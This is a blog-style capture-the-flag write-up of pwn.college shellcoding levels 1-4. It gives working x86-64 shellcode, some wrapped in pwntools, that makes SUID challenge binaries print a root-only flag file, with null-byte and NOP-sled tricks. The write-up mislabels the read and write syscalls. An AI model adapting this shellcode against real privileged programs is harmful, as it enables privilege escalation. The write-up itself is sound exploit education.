---
title: "Notes of pwn.college babyshell&sandboxing levels"
date: "2022-01-16"
author: "uoft-flyfreejay"
description: "short notes for pwn.college dojo's shellcoding exercises"
---

# Intro

So, here we go with the shellcoding modules. 

In these challenges, my goals are to read the contents of the `/flag` file. That file is only readable as a root. We will have to inject shellcodes into the binaries located under each `/challenge` folder to read the `/flag` using the SUID of the challenge binary. Of course, to make things more interesting each challenge will have their own special constraints. Let's get hacking!

## babyshell

### level1

- Referece: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

The very first level. Running `ls -al` in the `/challenge` directory reveals that the binary in the folder has SUID bit set. Constructing the shellcode:

```python
import pwn
import time

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"
pwn.context.log_level = "INFO"
pwn.warnings.simplefilter("ignore")

assembly = r'''
.global _start
.intel_syntax noprefix
_start:
    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    mov rax, 0
    syscall
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall
    mov rax, 60
    syscall
flag:
    .ascii "/flag\0"
'''

with pwn.process(f"/challenge/{pwn.os.getenv('HOSTNAME')}") as target:
    pwn.info(target.readrepeat(1))

    target.send(pwn.asm(assembly))
    pwn.info(target.readrepeat(1))
```

I wrapped the shellcode in python and used `pwntools` to send it to the binary. This code will be the default template for the future challenges. We use set `rax` to be 2 to open the `/flag`. We then store the returned FD into `rdi` and set `rax` to 0 to write to STDOUT. Lastly, we will set `rax` to 1 to read. 

### level2

This level has a new constraint. The program can skip upto 0x800 bytes from our shellcode. The hint was that we can use a simple 1 byte instruction to fill up the space, such as `nop`. This is called `nop sleding`. I will only post the shellcode from now.

```asm
.global _start
.intel_syntax noprefix
_start:
    .rept 0x800
    nop
    .endr
    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    mov rax, 0
    syscall
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall
    mov rax, 60
    syscall
flag:
    .ascii "/flag\0"
```

### level3

- Reference: https://www.youtube.com/watch?v=QYlJd_0hRmI&list=PL-ymxv0nOtqrx3u1ZH3J9keH1ZgK8wJXF&index=7

This level requires us not to have any `00` byte in our shellcode. Using `xor` trick to zero out the bits is the technique I used the most often. The hardest part was moving `/flag\0` characters into `rdi`. I referred to the office hour videos for that. What he did was building the string character by character in the stack. 

```asm
.global _start
.intel_syntax noprefix
_start:
    xor rax, rax
    mov al, 2
    mov byte ptr [rsp], '/'
    mov byte ptr [rsp+1], 'f'
    mov byte ptr [rsp+2], 'l'
    mov byte ptr [rsp+3], 'a'
    mov byte ptr [rsp+4], 'g'
    xor cl, cl
    mov byte ptr [rsp+5], cl
    mov rdi, rsp
    xor rsi, rsi
    syscall
    mov rdi, rax
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 100
    xor rax, rax
    syscall
    xor rdi, rdi
    mov dil, 1
    mov rsi, rsp
    mov rdx, rax
    xor rax, rax
    mov al, 1
    syscall
    xor rax, rax
    mov al, 60
    syscall
```

# level4

- Credit: Thank you `connojd`!

This level requires me not to use any H-bytes, meaning no 64-bit operations. Well for the most parts, that's easy, we can just use 32-bit registers. However, carrying the `/flag\0` string around was the hardest part here. A nice fella on Discord helped me out greatly on this one. I just pushed necessary char bytes to the stack, and used `push rsp`, `pop REG` consecutively to imitate `mov REG, rsp`. Here `REG` is any 64-bit register you want. 

```
.global _start
.intel_syntax noprefix
_start:
    mov eax, 2
    mov cx, 0x0067
    push cx
    mov cx, 0x616c
    push cx
    mov cx, 0x662f
    push cx
    push rsp
    pop rdi
    mov esi, 0
    syscall
    mov edi, eax
    push rsp
    pop rsi
    mov edx, 100
    mov eax, 0
    syscall
    mov edi, 1
    push rsp
    pop rsi
    mov edx, eax
    mov eax, 1
    syscall
    mov eax, 60
    syscall
```

